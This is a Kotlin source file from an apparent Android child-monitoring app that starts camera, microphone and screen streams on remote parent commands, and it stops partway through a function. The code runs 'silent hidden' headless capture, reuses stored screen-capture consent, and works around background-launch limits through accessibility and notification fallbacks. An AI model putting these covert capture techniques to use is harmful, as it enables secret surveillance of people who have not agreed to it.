package com.childmonitor.sync

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.content.Intent
import android.util.Log
import com.childmonitor.MainActivity
import com.childmonitor.MonitoringPrefs
import com.childmonitor.NativeSyncUploader
import com.childmonitor.PolicySyncManager
import com.childmonitor.debug.PcpFlowLogger
import com.childmonitor.debug.StreamState
import com.childmonitor.StreamingHeadlessTaskService
import com.childmonitor.accessibility.ScreenCaptureAutoApprove
import com.childmonitor.capture.AudioStreamForegroundService
import com.childmonitor.capture.CameraStreamForegroundService
import com.childmonitor.capture.ConsentLaunchSource
import com.childmonitor.capture.MediaProjectionConsentHelper
import com.childmonitor.capture.MediaProjectionConsentState
import com.childmonitor.capture.MediaProjectionLossHandler
import com.childmonitor.capture.MediaProjectionRecoveryWorker
import com.childmonitor.capture.MediaProjectionSessionKeeper
import com.childmonitor.capture.MediaProjectionTokenStore
import com.childmonitor.capture.StreamBootstrapActivity
import com.childmonitor.capture.StreamFgsHelper
import com.childmonitor.capture.StreamFgsPreparer
import com.childmonitor.capture.StreamKind
import com.childmonitor.capture.NativeStreamPublisher
import com.childmonitor.capture.ScreenCaptureController
import com.childmonitor.capture.ScreenCaptureForegroundService
import com.childmonitor.capture.ScreenFgsStartupGate
import com.childmonitor.capture.StreamCaptureTeardown
import com.childmonitor.capture.StreamLifecycleLogger
import com.childmonitor.capture.StreamTeardownCoordinator
import com.childmonitor.capture.StreamSessionRegistry
import com.childmonitor.capture.StreamSessionWatchdog
import com.childmonitor.deviceowner.DeviceOwnerManager
import com.childmonitor.sync.MediaProjectionRecoveryTelemetry
import com.childmonitor.native.ChildMonitorNativeModule
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference
import com.childmonitor.constants.ApiPaths

/**
 * Always-on streaming coordinator for [MonitoringForegroundService].
 * Uses native STOMP + HTTP poll so parent stream commands work without the RN UI process.
 */
object NativeStreamingCoordinator {

    private const val TAG = "NativeStreamingCoord"
    private const val POLL_MS = 3000L
    /** HTTP fallback when FGS burst ended but STOMP may drop under Doze. */
    private const val SLOW_POLL_MS = 30_000L

    private val running = AtomicBoolean(false)
    private val jsListenerActive = AtomicBoolean(false)
    private val streamStartInProgress = AtomicBoolean(false)
    private val mainHandler = Handler(Looper.getMainLooper())

    /** Pending screen stream to retry when FGS startup gate opens. */
    private data class PendingStreamRetry(
        val roomId: String,
        val streamType: String,
        val sessionId: String,
        val cameraFacing: String?,
        val reason: String,
        val attempt: Int = 0,
    )

    // P1-3: AtomicReference so set + postDelayed + compareAndSet are all race-free.
    // @Volatile alone does not protect the compound read-check-clear pattern used in
    // scheduleStreamRetry, which can lose a retry when two threads race.
    private val pendingStreamRetry = AtomicReference<PendingStreamRetry?>(null)

    @Volatile
    private var activeSessionId: String? = null

    @Volatile
    private var activeRoomId: String? = null

    @Volatile
    private var nativeScreenActive = false

    @Volatile
    private var consecutiveMissingActivePolls = 0

    private const val MAX_MISSING_ACTIVE_POLLS = 3

    private var pollRunnable: Runnable? = null
    private var appContext: Context? = null

    private fun resetActivePollMisses() {
        consecutiveMissingActivePolls = 0
    }

    private fun noteActivePollMiss(tag: String, detail: String): Boolean {
        val next = consecutiveMissingActivePolls + 1
        consecutiveMissingActivePolls = next
        Log.d(
            TAG,
            "$tag active-poll miss $next/$MAX_MISSING_ACTIVE_POLLS — $detail",
        )
        return next >= MAX_MISSING_ACTIVE_POLLS
    }

    fun start(context: Context) {
        if (!MonitoringPrefs.isPaired(context)) {
            Log.i(TAG, "Not paired — skip native streaming coordinator")
            return
        }
        if (!running.compareAndSet(false, true)) {
            NativeStompOwner.ensureConnected(context.applicationContext)
            if (pollRunnable == null) {
                startPollLoop()
            }
            return
        }
        appContext = context.applicationContext
        Log.i(TAG, "Starting native streaming coordinator")
        NativeStompOwner.start(context.applicationContext)
        startPollLoop()
    }

    /** Reconnect STOMP or start coordinator if idle — safe from WorkManager / boot recovery. */
    fun ensureConnected(context: Context) {
        if (!MonitoringPrefs.isPaired(context)) return
        if (!running.get()) {
            start(context)
            return
        }
        NativeStompOwner.ensureConnected(context.applicationContext)
    }

    /**
     * After a monitoring FGS burst ends: stop the HTTP poll loop but keep STOMP connected so
     * stream requests and commands arrive without waiting for the next WorkManager cycle.
     */
    fun pauseAfterBurst(context: Context) {
        if (!running.get()) return
        appContext = context.applicationContext
        mainHandler.removeCallbacksAndMessages(null)
        pollRunnable?.let { mainHandler.removeCallbacks(it) }
        pollRunnable = null
        NativeStompOwner.ensureConnected(context.applicationContext)
        startPollLoop(SLOW_POLL_MS)
        Log.i(TAG, "Paused fast poll after burst — STOMP + slow HTTP poll (${SLOW_POLL_MS}ms)")
    }

    fun stop(context: Context) {
        if (!running.getAndSet(false)) return
        Log.i(TAG, "Stopping native streaming coordinator")
        resetActivePollMisses()
        pendingStreamRetry.set(null)
        mainHandler.removeCallbacksAndMessages(null)
        pollRunnable?.let { mainHandler.removeCallbacks(it) }
        pollRunnable = null
        NativeStompOwner.stop()
        stopAllStreams(context.applicationContext, "coordinator stopped")
        appContext = null
    }

    fun setJsListenerActive(active: Boolean) {
        val prev = jsListenerActive.get()
        jsListenerActive.set(active)
        PcpFlowLogger.log(
            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
            "jsListenerActive changed",
            "prev=$prev next=$active reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        Log.i(TAG, "JS streaming listener active=$active (was $prev)")
    }

    fun isJsListenerActive(): Boolean = jsListenerActive.get()

    fun hasActiveStreamSession(): Boolean =
        streamStartInProgress.get() ||
            StreamTeardownCoordinator.isInProgress() ||
            activeSessionId != null ||
            nativeScreenActive ||
            com.childmonitor.capture.NativeStreamPublisher.isRunning() ||
            ScreenCaptureForegroundService.isForegroundActive() ||
            StreamSessionRegistry.activeOwner() != StreamSessionRegistry.Owner.NONE ||
            AudioStreamForegroundService.isActive() ||
            CameraStreamForegroundService.isActive()

    fun isCoordinatorRunning(): Boolean = running.get()

    /**
     * P1-4 accessor: exposes the coordinator-level session ID so [TypedStreamFgsTimeout]
     * can report a timeout even when [StreamSessionRegistry] was not updated (e.g. headless
     * task-service path that doesn't call [StreamSessionRegistry.tryAcquire]).
     */
    fun activeSessionId(): String? = activeSessionId

    /** Entry point for FCM high-priority stream wakes (Doze / screen off). */
    @JvmStatic
    fun handleStreamRequestFromWake(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ) {
        if (!MonitoringPrefs.isPaired(context)) return
        start(context.applicationContext)
        onStreamRequest(context.applicationContext, roomId, streamType, sessionId, cameraFacing)
    }

    /** Entry point for FCM high-priority camera flip when STOMP stream-control may be down. */
    @JvmStatic
    fun handleStreamControlFromWake(
        context: Context,
        sessionId: String,
        command: String,
    ) {
        if (!MonitoringPrefs.isPaired(context)) return
        start(context.applicationContext)
        onStreamControl(context.applicationContext, sessionId, command)
    }

    /** True when RN marked the listener active AND the JS runtime can receive events. */
    private fun canUseJsStreaming(): Boolean =
        jsListenerActive.get() && ChildMonitorNativeModule.canDeliverStreamToJs()

    private fun markActiveStream(roomId: String, sessionId: String) {
        activeRoomId = roomId
        activeSessionId = sessionId
    }

    private fun clearActiveStream() {
        activeRoomId = null
        activeSessionId = null
    }

    private fun isSameSessionAlreadyLive(sessionId: String, roomId: String): Boolean =
        NativeStreamingHandoffPolicy.isSameSessionAlreadyLive(
            activeSessionId = activeSessionId,
            activeRoomId = activeRoomId,
            requestedSessionId = sessionId,
            requestedRoomId = roomId,
            nativePublisherRunning = NativeStreamPublisher.isRunning(),
            registrySessionId = StreamSessionRegistry.activeSessionId(),
            screenFgsActive = ScreenCaptureForegroundService.isForegroundActive(),
            cameraActive = CameraStreamForegroundService.isActive(),
            audioActive = AudioStreamForegroundService.isActive(),
            startInProgress = streamStartInProgress.get(),
        )

    /**
     * Guarantee JS receives a stream-request when the native coordinator sees it first.
     * @return true if [emitStreamWake] was delivered to an active React instance.
     */
    private fun delegateStreamRequestToJs(
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ): Boolean {
        PcpFlowLogger.log(
            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
            "delegating stream request to JS",
            "type=$streamType session=$sessionId room=$roomId jsFlag=${jsListenerActive.get()} " +
                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        val delivered = ChildMonitorNativeModule.emitStreamWake(
            roomId, streamType, sessionId, cameraFacing,
        )
        if (delivered) {
            markActiveStream(roomId, sessionId)
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "JS wake event emitted",
                "type=$streamType session=$sessionId",
            )
            return true
        }
        PcpFlowLogger.warn(
            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
            "JS wake not delivered — native fallback will run",
            "type=$streamType session=$sessionId jsFlag=${jsListenerActive.get()} " +
                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        return false
    }

    private fun startJsOrHeadlessStream(
        context: Context,
        roomId: String,
        sessionId: String,
        streamType: String,
        cameraFacing: String?,
    ) {
        if (canUseJsStreaming()) {
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "RN listener active — silent hidden stream start",
                "type=$streamType session=$sessionId",
            )
            val delivered = ChildMonitorNativeModule.emitStreamWake(
                roomId, streamType, sessionId, cameraFacing,
            )
            if (delivered) {
                markActiveStream(roomId, sessionId)
                return
            }
            Log.w(
                TAG,
                "JS listener flagged but React inactive — falling back to headless " +
                    "type=$streamType session=$sessionId",
            )
        }
        stopAllStreams(context, "starting headless hidden stream")
        val kind = streamKindFrom(streamType)
        if (kind != null && !StreamFgsHelper.isActive(kind)) {
            // P1-2: parent stream request is a user-initiated trigger, so we may start
            // typed FGS even when the monitoring burst is inactive on Android 15+.
            // Falls through to the legacy ensureKindReady path on older OS versions.
            if (!StreamFgsPreparer.ensureKindReadyForStreamRequest(context, kind)) {
                PcpFlowLogger.warn(
                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                    "headless stream aborted — typed FGS not ready",
                    "kind=$kind session=$sessionId",
                )
                reportStreamFailure(context, sessionId, "FGS_NOT_READY")
                return
            }
        }
        PcpFlowLogger.log(
            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
            "headless hidden stream",
            "type=$streamType session=$sessionId jsFlag=${jsListenerActive.get()} " +
                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        markActiveStream(roomId, sessionId)
        StreamingHeadlessTaskService.start(context, roomId, sessionId, streamType, cameraFacing)
    }

    /** Reconnect STOMP after native API base URL changes. */
    fun onApiBaseUrlChanged(context: Context) {
        if (!running.get()) return
        Log.i(TAG, "API base changed — reconnecting STOMP owner")
        NativeStompOwner.onApiBaseUrlChanged(context.applicationContext)
    }

    /** Entry from [NativeStompOwner] — sole STOMP message path for device topics. */
    fun handleStompMessageFromOwner(context: Context, destination: String, body: String) {
        handleStompMessage(context, destination, body)
    }

    private fun handleStompMessage(context: Context, destination: String, body: String) {
        try {
            val json = JSONObject(body)
            json.optString("traceId").takeIf { it.isNotBlank() }?.let {
                PcpFlowLogger.setTraceId(it)
            }
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SOCKET_SIGNALING,
                "handleStompMessage",
                "STOMP message received",
                "destination=$destination bodyLen=${body.length}",
            )
            when {
                destination.contains("/commands") -> onDeviceCommand(
                    context,
                    json.optString("commandId"),
                    json.optString("commandType"),
                )
                destination.contains("/stream-request") -> onStreamRequest(
                    context,
                    json.optString("roomId"),
                    json.optString("streamType"),
                    json.optString("sessionId"),
                    json.optString("cameraFacing").takeIf { it.isNotBlank() },
                )
                destination.contains("/stream-stop") -> onStreamStop(
                    context,
                    json.optString("sessionId"),
                    json.optString("roomId"),
                )
                destination.contains("/stream-control") -> onStreamControl(
                    context,
                    json.optString("sessionId"),
                    json.optString("command"),
                )
                destination.contains("/policy-updates") -> Thread {
                    PolicySyncManager.syncPolicies(context.applicationContext)
                }.start()
            }
        } catch (e: Exception) {
            PcpFlowLogger.error(PcpFlowLogger.Category.SOCKET_SIGNALING, "handleStompMessage", "Failed to parse STOMP body", e)
            Log.e(TAG, "Failed to parse STOMP body destination=$destination", e)
        }
    }

    private fun onDeviceCommand(context: Context, commandId: String, commandType: String) {
        Thread {
            DeviceCommandProcessor.handleRealtimeCommand(context, commandId, commandType)
        }.start()
    }

    private fun onStreamRequest(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ) {
        Thread {
            onStreamRequestWorker(context, roomId, streamType, sessionId, cameraFacing)
        }.start()
    }

    private fun onStreamRequestWorker(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ) {
        if (roomId.isBlank() || sessionId.isBlank() || streamType.isBlank()) {
            PcpFlowLogger.warn(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "stream request dropped — blank fields",
                "roomBlank=${roomId.isBlank()} sessionBlank=${sessionId.isBlank()} typeBlank=${streamType.isBlank()}",
            )
            if (sessionId.isNotBlank()) {
                reportStreamFailure(context, sessionId, "INVALID_STREAM_REQUEST")
            }
            return
        }
        if (!streamStartInProgress.compareAndSet(false, true)) {
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "stream request queued — another start in progress",
                "type=$streamType session=$sessionId",
            )
            scheduleStreamRetry(context, roomId, streamType, sessionId, cameraFacing, "START_IN_PROGRESS", 0)
            return
        }
        try {
            onStreamRequestWorkerLocked(context, roomId, streamType, sessionId, cameraFacing)
        } finally {
            streamStartInProgress.set(false)
        }
    }

    private fun onStreamRequestWorkerLocked(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ) {
        // Any new start supersedes an in-flight STOP — otherwise the 30s JS watchdog from
        // the previous session destroys capturers mid-start (seen as "no child offer").
        StreamTeardownCoordinator.abortPendingJsTeardown("stream-request:$sessionId")
        PcpFlowLogger.transitionState(StreamState.REQUEST_RECEIVED, "onStreamRequestWorkerLocked",
            "type=$streamType room=$roomId session=$sessionId")
        PcpFlowLogger.log(
            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
            "child stream request received (native coordinator)",
            "type=$streamType room=$roomId session=$sessionId jsFlag=${jsListenerActive.get()} " +
                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        Log.i(
            TAG,
            "stream-request type=$streamType room=$roomId session=$sessionId " +
                "jsFlag=${jsListenerActive.get()} reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()} " +
                "hasToken=${MediaProjectionTokenStore.hasValidToken(context)} " +
                "hasProjection=${ScreenCaptureController.activeProjection() != null} " +
                "nativeScreenRunning=${NativeStreamPublisher.isRunning()}",
        )

        if (canUseJsStreaming()) {
            // Parent Start Screen must obtain Cast (if needed) before JS publish — same for
            // open/background. Never auto-consent outside this parent Start path.
            if (streamKindFrom(streamType) == StreamKind.SCREEN &&
                !ensureScreenConsentForParentStart(context, sessionId)
            ) {
                return
            }
            if (delegateStreamRequestToJs(roomId, streamType, sessionId, cameraFacing)) {
                return
            }
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "native coordinator routing — JS delegation failed, continuing native path",
                "type=$streamType session=$sessionId",
            )
        }

        // Remote streams never launch MainActivity — headless or silent JS only.
        if (isBackgroundStream(streamType)) {
            if (isSameSessionAlreadyLive(sessionId, roomId)) return

            val kind = streamKindFrom(streamType)

            if (kind == StreamKind.SCREEN && !ensureScreenConsentForParentStart(context, sessionId)) {
                return
            }
            if (kind == StreamKind.SCREEN && !canUseStoredProjection(context)) {
                reportStreamFailure(context, sessionId, "NO_SCREEN_CAPTURE_CONSENT")
                PcpFlowLogger.warn(
                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                    "screen stream aborted — no stored screen capture consent after parent Start",
                    "session=$sessionId",
                )
                return
            }
            if (kind == StreamKind.SCREEN && !ScreenFgsStartupGate.canStartScreenFgs()) {
                // Ensure the gate is scheduled — Android 15 burst used to leave it closed forever.
                ScreenFgsStartupGate.scheduleMarkReadyFromService(
                    com.childmonitor.platform.AndroidPlatform.screenFgsColdStartDelayMs(),
                )
                scheduleStreamRetry(context, roomId, streamType, sessionId, cameraFacing, "FGS_GATE_CLOSED", 0)
                PcpFlowLogger.warn(
                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                    "screen stream deferred — FGS startup gate closed (gate open scheduled)",
                    "session=$sessionId",
                )
                return
            }
            if (kind == StreamKind.SCREEN && !MediaProjectionSessionKeeper.ensureReady(context)) {
                scheduleStreamRetry(context, roomId, streamType, sessionId, cameraFacing, "PROJECTION_SESSION_NOT_WARM", 0)
                PcpFlowLogger.warn(
                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                    "screen stream deferred — projection session warming",
                    "session=$sessionId",
                )
                return
            }

            if (kind != null && !StreamFgsHelper.isActive(kind)) {
                PcpFlowLogger.transitionState(StreamState.SERVICE_STARTING, "onStreamRequestWorkerLocked",
                    "kind=$kind session=$sessionId")
                // Inbound parent request may legally start typed FGS even without a monitoring
                // burst (API 35+). ensureKindReadyForStreamRequest opens the screen FGS gate.
                if (StreamFgsPreparer.ensureKindReadyForStreamRequest(context, kind)) {
                    PcpFlowLogger.transitionState(StreamState.SERVICE_STARTED, "onStreamRequestWorkerLocked",
                        "kind=$kind session=$sessionId")
                    // FGS pre-warmed — fall through to stream start below.
                } else {
                    markActiveStream(roomId, sessionId)
                    val useNativeScreen =
                        kind == StreamKind.SCREEN &&
                            canUseStoredProjection(context) &&
                            !canUseJsStreaming()
                    PcpFlowLogger.log(
                        PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                        "stream bootstrap — FGS not active",
                        "kind=$kind session=$sessionId nativeScreen=$useNativeScreen",
                    )
                    // Use BAL-safe launcher: direct → accessibility → fullScreenIntent
                    // notification.  Plain startActivity() is silently blocked by MIUI
                    // when the app is in the background.
                    StreamBootstrapActivity.startWithBalFallback(
                        context,
                        kind,
                        roomId,
                        sessionId,
                        streamType,
                        cameraFacing,
                        canUseJsStreaming(),
                        useNativeScreen,
                    )
                    return
                }
            }

            if (
                streamType.equals("SCREEN", ignoreCase = true) &&
                canUseStoredProjection(context) &&
                !canUseJsStreaming() &&
                !StreamSessionRegistry.isBlocked(StreamSessionRegistry.Owner.NATIVE_PUBLISHER)
            ) {
                // Same live session — keep publisher; do not tear down / re-arm watchdog.
                if (
                    sessionId == activeSessionId &&
                    roomId == activeRoomId &&
                    NativeStreamPublisher.isRunning()
                ) {
                    Log.i(TAG, "native screen already active for session=$sessionId — skipping restart")
                    return
                }
                // Only tear down a previous publisher/owner. Never wipe a just-warmed
                // MediaProjection FGS from ensureConsent when nothing is publishing yet —
                // that used to drop the binder and force another Cast prompt.
                val hasPriorPublisher =
                    NativeStreamPublisher.isRunning() ||
                        StreamSessionRegistry.activeOwner() != StreamSessionRegistry.Owner.NONE
                if (hasPriorPublisher) {
                    // Keep warm MediaProjection FGS; only stop previous publisher/session.
                    StreamTeardownCoordinator.stopPublisherPreservingWarmScreenFgs(
                        context,
                        "new native screen stream",
                    )
                } else {
                    StreamTeardownCoordinator.abortPendingJsTeardown("new native screen cold start")
                }
                nativeScreenActive = false
                markActiveStream(roomId, sessionId)
                PcpFlowLogger.log(
                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                    "native capture start",
                    "room=$roomId session=$sessionId priorPublisher=$hasPriorPublisher",
                )
                ScreenCaptureForegroundService.startStream(context, roomId, sessionId)
                StreamTeardownCoordinator.abortPendingJsTeardown("native screen started")
                nativeScreenActive = true
                return
            }

            startJsOrHeadlessStream(context, roomId, sessionId, streamType, cameraFacing)
            return
        }

        if (canUseJsStreaming()) {
            if (delegateStreamRequestToJs(roomId, streamType, sessionId, cameraFacing)) {
                return
            }
        }

        if (isSameSessionAlreadyLive(sessionId, roomId)) {
            return
        }

        stopAllStreams(context, "starting headless RN stream")
        markActiveStream(roomId, sessionId)
        StreamingHeadlessTaskService.start(context, roomId, sessionId, streamType, cameraFacing)
    }

    private fun isBackgroundStream(streamType: String): Boolean {
        return streamType.equals("CAMERA", ignoreCase = true) ||
            streamType.equals("AUDIO", ignoreCase = true) ||
            streamType.equals("SCREEN", ignoreCase = true)
    }

    private fun streamKindFrom(streamType: String): StreamKind? = when (streamType.uppercase()) {
        "CAMERA" -> StreamKind.CAMERA
        "AUDIO" -> StreamKind.AUDIO
        "SCREEN" -> StreamKind.SCREEN
        else -> null
    }

    private fun onStreamStop(context: Context, sessionId: String, roomId: String) {
        Log.i(
            TAG,
            "stream-stop session=$sessionId room=$roomId jsFlag=${jsListenerActive.get()} " +
                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
        )
        // Takeover race: a newer start is already running — do not tear down FGS/camera.
        if (streamStartInProgress.get() &&
            activeSessionId != null &&
            sessionId.isNotBlank() &&
            activeSessionId != sessionId
        ) {
            Log.w(
                TAG,
                "stream-stop ignored — start in progress for newer session=$activeSessionId " +
                    "(stop was for $sessionId)",
            )
            return
        }
        if (sessionId.isNotBlank() && activeSessionId != null && activeSessionId != sessionId) {
            if (roomId.isBlank() || activeRoomId == null || activeRoomId != roomId) {
                Log.w(TAG, "stream-stop ignored — session mismatch want=$sessionId have=$activeSessionId")
                return
            }
            Log.w(TAG, "stream-stop session mismatch but room matches — stopping room=$roomId")
        }
        if (roomId.isNotBlank() && activeRoomId != null && activeRoomId != roomId) {
            Log.w(TAG, "stream-stop ignored — room mismatch want=$roomId have=$activeRoomId")
            return
        }
        stopAllStreams(context, "parent stop (STOMP)")
    }

    private fun onStreamControl(context: Context, sessionId: String, command: String) {
        if (!command.equals("SWITCH_CAMERA", ignoreCase = true)) return
        if (sessionId.isNotBlank() && activeSessionId != null && activeSessionId != sessionId) {
            Log.w(TAG, "stream-control SWITCH_CAMERA ignored — session mismatch want=$sessionId have=$activeSessionId")
            return
        }
        if (!com.childmonitor.fcm.FcmStreamControlActions.acceptFlip()) {
            Log.i(TAG, "stream-control SWITCH_CAMERA ignored — duplicate STOMP/FCM")
            return
        }
        Log.i(
            TAG,
            "stream-control SWITCH_CAMERA received session=$sessionId " +
                "cameraActive=${com.oney.WebRTCModule.HiddenCameraBridge.isCaptureActive()} " +
                "jsActive=${jsListenerActive.get()} canJs=${canUseJsStreaming()}",
        )

        // Primary path: flip on the native CameraX capturer. Do not emit SWITCH_CAMERA to JS
        // afterward — JS listeners would call switchCamera() and flip a second time (net no-op).
        if (com.oney.WebRTCModule.HiddenCameraBridge.isCaptureActive()) {
            com.oney.WebRTCModule.HiddenCameraBridge.switchFacingToggle { facing, err ->
                if (err != null) {
                    Log.w(TAG, "native SWITCH_CAMERA failed: ${err.message}", err)
                    val delivered =
                        com.childmonitor.native.ChildMonitorNativeModule.emitStreamControl("SWITCH_CAMERA")
                    if (!delivered) {
                        StreamingHeadlessTaskService.sendSwitchCamera(context)
                    }
                } else {
                    Log.i(TAG, "native SWITCH_CAMERA ok facing=$facing")
                }
            }
            return
        }

        val delivered = com.childmonitor.native.ChildMonitorNativeModule.emitStreamControl("SWITCH_CAMERA")
        Log.i(TAG, "stream-control SWITCH_CAMERA (no native camera) delivered=$delivered")
        if (!delivered) {
            StreamingHeadlessTaskService.sendSwitchCamera(context)
        }
    }

    private fun stopAllStreams(context: Context, reason: String) {
        StreamLifecycleLogger.warn("STREAM_STOP_ALL", reason)
        Log.i(TAG, "stopAllStreams reason=$reason")
        resetActivePollMisses()
        nativeScreenActive = false
        clearActiveStream()
        StreamCaptureTeardown.stopAll(context, reason)
    }

    private fun startPollLoop(intervalMs: Long = POLL_MS) {
        pollRunnable?.let { mainHandler.removeCallbacks(it) }
        pollRunnable = object : Runnable {
            override fun run() {
                val ctx = appContext
                if (ctx != null && running.get()) {
                    Thread { pollSessions(ctx) }.start()
                }
                if (running.get()) {
                    mainHandler.postDelayed(this, intervalMs)
                }
            }
        }
        val runnable = pollRunnable ?: return
        mainHandler.post(runnable)
    }

    private fun pollSessions(context: Context) {
        // jsPeerActive must reflect the JS publisher / capture path, NOT the wake-listener flag.
        // Backgrounding pauses the STOMP wake listener (jsListenerActive=false) while the hidden
        // screen PC + FGS stay alive — treating that as "JS peer dead" false-orphans the session.
        val jsPeerAlive =
            (
                StreamSessionRegistry.activeOwner() == StreamSessionRegistry.Owner.JS_HIDDEN &&
                    ScreenCaptureForegroundService.isForegroundActive()
            ) ||
                (
                    jsListenerActive.get() &&
                        ChildMonitorNativeModule.canDeliverStreamToJs()
                )
        StreamSessionRegistry.reconcile(
            NativeStreamPublisher.isRunning(),
            jsPeerAlive,
        )
        StreamSessionWatchdog.tick(context)
        Thread {
            DeviceCommandProcessor.pollAndExecute(context)
        }.start()

        if (canUseJsStreaming()) return

        // P1-6: Skip the pending-sessions HTTP poll when a stream is already active.
        // STOMP will have already delivered the same request; making this call every 3s
        // during active streaming is pure battery drain with no benefit.
        // The active-session check below is still needed to detect parent-initiated stops.
        if (!hasActiveStreamSession()) {
            val pendingJson = DeviceHttpClient.get(context, ApiPaths.CHILD_STREAMING_PENDING)
            if (pendingJson != null) {
                try {
                    val pendingRoot = JSONObject(pendingJson)
                    val pendingArr = pendingRoot.optJSONArray("data")
                    if (pendingArr != null && pendingArr.length() > 0) {
                        val first = pendingArr.getJSONObject(0)
                        val pollSessionId = first.optString("sessionId")
                        // P1-2: dedup — skip if STOMP already started handling this session.
                        // activeSessionId is set in delegateStreamRequestToJs / onStreamRequestWorkerLocked
                        // before returning, so a matching ID means the request is already in-flight.
                        if (pollSessionId.isNotBlank() && pollSessionId == activeSessionId) {
                            Log.d(
                                TAG,
                                "pollSessions: pending session already handled via STOMP — " +
                                    "skipping duplicate sessionId=$pollSessionId",
                            )
                        } else {
                            Log.d(TAG, "pollSessions: dispatching pending session=$pollSessionId via HTTP poll")
                            onStreamRequest(
                                context,
                                first.optString("signalingRoomId"),
                                first.optString("streamType"),
                                pollSessionId,
                                null,
                            )
                        }
                        return
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "pollSessions pending check failed", e)
                    return
                }
            }
        }

        // Always check the active session to detect parent-initiated stream stops.
        try {
            val activeJson = DeviceHttpClient.get(context, ApiPaths.CHILD_STREAMING_ACTIVE) ?: return
            val activeRoot = JSONObject(activeJson)
            if (activeRoot.isNull("data")) {
                if (activeSessionId != null || nativeScreenActive || NativeStreamPublisher.isRunning()) {
                    if (StreamSessionRegistry.isNegotiatingOrReconnecting()) {
                        resetActivePollMisses()
                        return
                    }
                    // Do not tear down while JS still owns a stream but paused its STOMP
                    // listener (MainActivity backgrounded) — parent session may still be ACTIVE
                    // and a transient empty poll must not kill capture. But if the backend keeps
                    // reporting no active session for several polls in a row, tear the stream down
                    // anyway so camera/mic indicators do not stick after the parent disappears.
                    if (jsListenerActive.get() ||
                        ChildMonitorNativeModule.canDeliverStreamToJs() ||
                        (
                            StreamSessionRegistry.activeOwner() ==
                                StreamSessionRegistry.Owner.JS_HIDDEN &&
                                ScreenCaptureForegroundService.isForegroundActive()
                        )
                    ) {
                        if (!noteActivePollMiss(
                                "pollSessions:",
                                "empty active payload while JS stream path is alive",
                            )
                        ) {
                            return
                        }
                        stopAllStreams(context, "no active session after repeated polls")
                        return
                    }
                    if (ScreenCaptureForegroundService.isForegroundActive() ||
                        NativeStreamPublisher.isRunning()
                    ) {
                        if (!noteActivePollMiss(
                                "pollSessions:",
                                "empty active payload while native screen pipeline is alive",
                            )
                        ) {
                            return
                        }
                        stopAllStreams(context, "no active session after repeated polls")
                        return
                    }
                    stopAllStreams(context, "no active session (poll)")
                }
                resetActivePollMisses()
                return
            }
            val active = activeRoot.getJSONObject("data")
            val sessionId = active.optString("sessionId")
            val status = active.optString("status")
            if (sessionId == activeSessionId && (status == "ACTIVE" || status == "PENDING")) {
                resetActivePollMisses()
                return
            }
            if (activeSessionId != null) {
                if (ScreenCaptureForegroundService.isForegroundActive() ||
                    NativeStreamPublisher.isRunning() ||
                    (
                        StreamSessionRegistry.activeOwner() ==
                            StreamSessionRegistry.Owner.JS_HIDDEN &&
                            status == "ACTIVE"
                    )
                ) {
                    if (!noteActivePollMiss(
                            "pollSessions:",
                            "status mismatch while local pipeline is still live " +
                                "status=$status localSession=$activeSessionId remoteSession=$sessionId",
                        )
                    ) {
                        return
                    }
                    stopAllStreams(context, "active session changed after repeated polls")
                    return
                }
                stopAllStreams(context, "active session ended (poll)")
                return
            }
            resetActivePollMisses()
        } catch (e: Exception) {
            Log.w(TAG, "pollSessions active check failed", e)
        }
    }

    private fun canUseStoredProjection(context: Context): Boolean {
        return ScreenCaptureController.canUseSilentCapture(context)
    }

    private fun canNativeSilentScreen(context: Context): Boolean {
        return DeviceOwnerManager.isDeviceOwner(context) &&
            ScreenCaptureController.canUseSilentCapture(context)
    }

    private fun wakeMainActivityForStream(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
    ) {
        try {
            val intent = Intent(context, MainActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK
                        or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                        or Intent.FLAG_ACTIVITY_SINGLE_TOP,
                )
                putExtra(MainActivity.EXTRA_STREAM_WAKE, true)
                putExtra(MainActivity.EXTRA_ROOM_ID, roomId)
                putExtra(MainActivity.EXTRA_STREAM_TYPE, streamType)
                putExtra(MainActivity.EXTRA_SESSION_ID, sessionId)
                if (!cameraFacing.isNullOrBlank()) {
